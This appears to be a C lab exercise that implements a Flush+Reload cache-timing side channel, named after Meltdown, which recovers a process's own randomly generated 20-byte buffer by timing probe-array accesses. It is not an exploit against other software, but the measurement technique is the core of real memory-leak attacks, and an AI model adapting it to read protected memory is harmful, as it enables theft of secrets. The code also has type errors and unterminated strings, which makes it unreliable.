#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <limits.h>

#define REPS_THRES 1000000
#define REPS_MELT 5
#define BYTE 256
#define OFFSET 4096
#define CACHE_LINE 64 

char* secret_data;	
char* probe;	

static void flush(void *p) {
    asm volatile("mfence\nclflush 0(%0)\n" : : "c"(p) : "rax");
    //_mm_clflush(&p);
}

static void load(void *p) {
    asm volatile("mfence\nmovq (%0), %%rax\n" : : "c"(p) : "rax");
}

static int64_t rdtsc() {
    // u_int64_t a = 0, d = 0;
    // asm volatile("mfence");
    // asm volatile("rdtsc" : "=A"(a));
    // a = (d << 32) | a;
    // asm volatile("mfence");
    // return a;
    return __rdtsc();
}
  
static int64_t timed_access(void *p, int do_flush, int do_preload) {

    if (do_flush) {
        flush(p);
    } else if (do_preload) {
        load(p);
    }

    volatile unsigned long time;
	asm __volatile__(
			"  mfence             \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  lfence             \n"
			"  movl %%eax, %%esi  \n"
			"  movl (%1), %%eax   \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  subl %%esi, %%eax  \n"
			: "=a"(time)
			: "c"(p)
			: "%esi", "%edx");
	return (int64_t) time;

    // uint64_t x = rdtsc();
    // load(p);
    // return rdtsc()-x;
}


static int64_t get_threshold() {
    long int time_flushed = 0;
    long int time_unflushed = 0;

    for (int i = 0; i < REPS_THRES; i++)
    {
        time_flushed += timed_access(&probe, 1, 0);
        time_unflushed += timed_access(&probe, 0, 1);
    }

    printf("on average it took this long to call unflushed: %ld\n", time_unflushed/REPS_THRES);
    printf("it took this long to call flushed: %ld\n", time_flushed/REPS_THRES);
    printf("average diff: %ld\n", (time_flushed-time_unflushed)/REPS_THRES);

    return (2*time_flushed+time_unflushed)/(3*REPS_THRES);
}


static int compare (const void * a, const void * b) {
   return ( *(int64_t*)a - *(int64_t*)b );
}

static __attribute__((optimize("-O0"))) char* melt_char(char *p, char* probe, int64_t thres) {
    char c;

    int64_t access_times[BYTE];
    for(int i = 0; i < BYTE; i++) {
        access_times[i] = INT64_MAX;
    }

    for (int j = 0; j < BYTE*OFFSET; j++)
    {
        flush(&probe[j]);
    }

    for(int i = 0; i < REPS_MELT; i++) {
        for (int j = 0; j < BYTE; j++) {
            char _ = probe[(*(volatile char *)p) * OFFSET];
            int64_t tmp = timed_access(&probe[j*OFFSET], 0, 0);
            if (tmp < thres && tmp != 0 && tmp < access_times[j]) {
                access_times[j] = tmp;
            }
        //    flush(&probe[j*OFFSET]);
        }
        for (int j = 0; j < BYTE*OFFSET; j++)
        {
            flush(&probe[j]);
        }
    } 
    
    int64_t min_time = INT64_MAX;
    char *min_ix;

    for(int i = 0; i < BYTE; i++) {
        if (min_time > access_times[i]) {
            min_ix = i;
            min_time = access_times[i];
        }
    }

    printf("found the following character: %c, %d\n", min_ix, min_ix);
    return min_ix;
}

void main()
{   
    secret_data = malloc(20);
    probe = malloc(BYTE * OFFSET);

    srand(time(NULL));
    for (int i = 0; i < 20; i++)
    {
        int r =  rand() % 95 + 32; // Get ASCII character in [32,127], i.e. in the range of printable characters
        secret_data[i] = r; 
    }
    printf("created random printable character array: %s\n", secret_data);

    int64_t thres = get_threshold();
    printf("computed threshold: %ld\n", thres);


    char* recovered_data = malloc(20); 


    for (int i = 0; i < 20; i++)
    {
        recovered_data[i] = melt_char(secret_data + i, probe, thres);
    }
    
    printf("expected: %s\ngot:%s\n", secret_data, recovered_data);    
}

